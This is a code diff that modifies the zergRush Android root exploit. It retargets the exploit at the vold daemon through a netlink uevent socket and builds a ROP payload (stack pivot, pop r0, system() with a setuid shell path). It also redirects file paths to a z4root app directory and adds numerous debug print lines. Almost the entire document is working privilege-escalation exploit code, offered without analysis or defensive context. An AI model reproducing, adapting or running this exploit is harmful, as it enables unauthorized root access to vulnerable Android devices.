@@ -15,6 +15,14 @@
  * agcc zergRush.c -o zergRush -ldiskconfig -lcutils
  *
  */
+
+#include "jni.h"
+#include <sys/stat.h>
+#include <linux/netlink.h>
+#include <math.h>
+#include <elf.h>
+
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -38,11 +46,19 @@
 #include <cutils/sockets.h>
 #include <private/android_filesystem_config.h>
 
+static struct {
+	pid_t pid;
+	uint32_t got_start, got_end;
+	uint32_t system;
+	char *device;
+	char found;
+} vold;
+
 static pid_t logcat_pid = 0;
-static char *sh = "/data/local/tmp/sh";
-static char *bsh = "/data/local/tmp/boomsh";
-static char *crashlog = "/data/local/tmp/crashlog";
-static char *vold = "/system/bin/vold";
+static char *sh = "/data/data/com.z4mod.z4root2/files/sh";
+static char *bsh = "/data/data/com.z4mod.z4root2/files/boomsh";
+static char *crashlog = "/data/data/com.z4mod.z4root2/files/crashlog";
+//static char *vold = "/system/bin/vold";
 
 uint32_t heap_addr;
 uint32_t libc_base;
@@ -196,35 +212,93 @@ static int check_addr(uint32_t addr)
 	return 0;
 }
 
+static void find_vold()
+{
+	char buf[2048], *ptr = NULL;
+	int i = 0, fd;
+	pid_t found = 0;
+	FILE *f = NULL;
+
+	vold.found = 0;
+
+	if ((f = fopen("/proc/net/netlink", "r")) == NULL)
+		die("[-] fopen");
+
+	for (;!feof(f);) {
+		memset(buf, 0, sizeof(buf));
+		if (!fgets(buf, sizeof(buf), f))
+			break;
+		if ((ptr = strtok(buf, "\t ")) == NULL)
+			break;
+		if ((ptr = strtok(NULL, "\t ")) == NULL)
+			break;
+		if ((ptr = strtok(NULL, "\t ")) == NULL)
+			break;
+		if (!*ptr)
+			break;
+		i = atoi(ptr);
+		if (i <= 1)
+			continue;
+		sprintf(buf, "/proc/%d/cmdline", i);
+		if ((fd = open(buf, O_RDONLY)) < 0)
+			continue;
+		memset(buf, 0, sizeof(buf));
+		read(fd, buf, sizeof(buf) - 1);
+		close(fd);
+		if (strstr(buf, "/system/bin/vold")) {
+			found = i;
+			break;
+		}
+        }
+	fclose(f);
+	if (!found)
+		return;
+
+	vold.pid = found;
+	vold.found = 1;
+
+	/* If already called no need to look for the mappings again as
+	 * they wont change
+	 */
+	if (vold.system)
+		return;
+
+	ptr = find_symbol("system");
+	vold.system = (uint32_t)ptr;
+	printf("[+] Found system: %p strcmp: %p\n", ptr, find_symbol("strcmp"));
+        return;
+}
 
 static int do_fault()
 {
-	char buf[255];
-	int sock = -1, n = 0, i;
 	char s_stack_addr[5], s_stack_pivot_addr[5], s_pop_r0_addr[5], s_system[5], s_bsh_addr[5], s_heap_addr[5];
 	uint32_t bsh_addr;
 	char padding[128];
 	int32_t padding_sz = (jumpsz == 0 ? 0 : gadget_jumpsz - jumpsz);
 
-	if(samsung) {
-		printf("[*] Sleeping a bit (~40s)...\n");
-		sleep(40);
-		printf("[*] Waking !\n");
-	}
+	char buf[0x1000];
+	struct sockaddr_nl snl;
+	struct iovec iov = {buf, sizeof(buf)};
+	struct msghdr msg = {&snl, sizeof(snl), &iov, 1, NULL, 0, 0};
+	int sock = -1, n = 0,i=0;
 
-	memset(padding, 0, 128);
-	strcpy(padding, "LORDZZZZzzzz");
-	if(padding_sz > 0) {
-		memset(padding+12, 'Z', padding_sz);
-		printf("[*] Popping %d more zerglings\n", padding_sz);
-	}
-	else if(padding_sz < 0) {
-		memset(padding, 0, 128);
-		memset(padding, 'Z', 12+padding_sz);
-	}
+	do {
+		find_vold();
+		usleep(10000);
+	} while (!vold.found);
 
-	if ((sock = socket_local_client("vold", ANDROID_SOCKET_NAMESPACE_RESERVED, SOCK_STREAM)) < 0)
-		die("[-] Error creating Nydus");
+	usleep(200000);
+	memset(buf, 0, sizeof(buf));
+	memset(&snl, 0, sizeof(snl));
+	snl.nl_family = AF_NETLINK;
+
+	if ((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT)) < 0)
+		die("[-] socket");
+	snl.nl_pid = vold.pid;
+
+	memset(buf, 0, sizeof(buf));
+
+
 
 	sprintf(s_stack_addr, "%c%c%c%c", stack_addr & 0xff, (stack_addr>>8)&0xff, (stack_addr>>16)&0xff, (stack_addr>>24)&0xff);
 	sprintf(s_stack_pivot_addr, "%c%c%c%c", stack_pivot & 0xff, (stack_pivot>>8)&0xff, (stack_pivot>>16)&0xff, (stack_pivot>>24)&0xff);
@@ -255,16 +329,20 @@ static int do_fault()
 
 	n += sprintf(buf+n+1, "%s%s OVER%s%s%s%sZZZZ%s%c", s_stack_addr, s_heap_addr, padding, s_pop_r0_addr, s_bsh_addr, s_system, bsh, 0);
 
-	printf("[*] Sending %d zerglings ...\n", n);
+	msg.msg_iov->iov_len = n;
 
-	if ((n = write(sock, buf, n+1)) < 0)
-		die("[-] Nydus seems broken");
+	n = sendmsg(sock, &msg, 0);
+	printf("[*] sendmsg result: 0x%08x\n",n);
 
-	sleep(3);
+	usleep(5000);
+
 	close(sock);
-
 	return n;
 }
+
+
+static int do_fault_bak()
+{}
 
 
 static int find_rop_gadgets()
@@ -333,31 +411,37 @@ static int find_rop_gadgets()
 
 static uint32_t checkcrash()
 {
+	printf("\n[**] yangxueping's checkcrash1111111+++++++++++++++\n");
 	uint32_t fault_addr = 0;
 	char buf[1024], *ptr = NULL;
 	FILE *f = NULL;
 	long pos = 0;
 	int ret=0;
-
+	printf("\n[**] yangxueping's checkcrash22222222+++++++++++++++\n");
 	system("/system/bin/logcat -c");
 	unlink(crashlog);
-
+	printf("\n[**] yangxueping's checkcrash33333333333+++++++++++++++\n");
 	if ((logcat_pid = fork()) == 0) {
+		printf("\n[**] yangxueping's checkcrash4444+++++++++++++++\n");
 		char *a[] = {"/system/bin/logcat", "-b", "main", "-f", crashlog, NULL};
 		execve(*a, a, environ);
+		printf("\n[**] yangxueping's checkcrash55555555555+++++++++++++++\n");
 		exit(1);
 	}
 	sleep(3);
-
+	printf("\n[**] yangxueping's checkcrash6666666666+++++++++++++++\n");
 	if (do_fault() < 0)
 		die("[-] Zerglings did not cause crash");
+	printf("\n[**] yangxueping's checkcrash7777777777+++++++++++++++\n");
 	/* Give logcat time to write to file
 	 */
 	sleep(3);
 	if ((f = fopen(crashlog, "r")) == NULL)
 		die("[-] Zerglings did not leave stuff at all");
+	printf("\n[**] yangxueping's checkcrash88888888888+++++++++++++++\n");
 	fseek(f, pos, SEEK_SET);
 	do {
+		//printf("\n[**] yangxueping's checkcrash999999999999+++++++++++++++\n");
 		memset(buf, 0, sizeof(buf));
 		if (!fgets(buf, sizeof(buf), f))
 			break;
@@ -375,10 +459,11 @@ static uint32_t checkcrash()
 			ptr += 5;
 			fp = (uint32_t)strtoul(ptr, NULL, 16);
 		}
+		//printf("\n[**] yangxueping's checkcrash1000000000000+++++++++++++++\n");
 	} while (!feof(f));
 	pos = ftell(f);
 	fclose(f);
-
+	printf("\n[**] yangxueping's checkcrash122222222222222+++++++++++++++\n");
 	return ret;
 }
 
@@ -416,29 +501,34 @@ static uint32_t check_libc_base()
 
 static uint32_t find_stack_addr()
 {
+	//printf("\n[**] yangxueping's find_stack_addr1111111+++++++++++++++\n");
 	uint32_t fault_addr = 0;
 	char buf[1024], *ptr = NULL;
 	FILE *f = NULL;
 	long pos = 0;
 	uint32_t sp=0, over=0;
-
+	//printf("\n[**] yangxueping's find_stack_addr22222222+++++++++++++++\n");
 	system("/system/bin/logcat -c");
 	unlink(crashlog);
-
+	//printf("\n[**] yangxueping's find_stack_add333333333+++++++++++++++\n");
 	if ((logcat_pid = fork()) == 0) {
+		printf("\n[**] yangxueping's find_stack_addr444444444+++++++++++++++\n");
 		char *a[] = {"/system/bin/logcat", "-b", "main", "-f", crashlog, NULL};
 		execve(*a, a, environ);
+		printf("\n[**] yangxueping's find_stack_addr5555555555+++++++++++++++\n");
 		exit(1);
 	}
 	sleep(3);
-
+	printf("\n[**] yangxueping's find_stack_addr66666666+++++++++++++++\n");
 	if (do_fault() < 0)
 		die("[-] Zerglings did not cause crash");
+	printf("\n[**] yangxueping's find_stack_addr77777777+++++++++++++++\n");
 	/* Give logcat time to write to file
 	 */
 	sleep(3);
 	if ((f = fopen(crashlog, "r")) == NULL)
 		die("[-] Zerglings did not leave stuff at all");
+	printf("\n[**] yangxueping's find_stack_addr88888888888+++++++++++++++\n");
 	fseek(f, pos, SEEK_SET);
 	do {
 		memset(buf, 0, sizeof(buf));
@@ -468,11 +558,11 @@ static uint32_t find_stack_addr()
 			ptr += 5;
 			fp = (uint32_t)strtoul(ptr, NULL, 16);
 		}
-
+		//printf("\n[**] yangxueping's find_stack_addr9999999999999+++++++++++++++\n");
 	} while (!feof(f));
 	pos = ftell(f);
 	fclose(f);
-
+	printf("\n[**] yangxueping's find_stack_addr1000000+++++++++++++++\n");
 	if(over && sp)
 		jumpsz = over - sp;
 
@@ -510,7 +600,8 @@ int main(int argc, char **argv, char **env)
 
 	chmod(bsh, 0711);
 
-	stat(vold, &st);
+	char *vold2 = "/system/bin/vold";
+	stat(vold2, &st);
 	heap_base_addr = ((((st.st_size) + 0x8000) / 0x1000) + 1) * 0x1000;
 
 	__system_property_get("ro.build.version.release", version_release);
@@ -635,4 +726,3 @@ int main(int argc, char **argv, char **env)
 
 	return 0;
 }
-
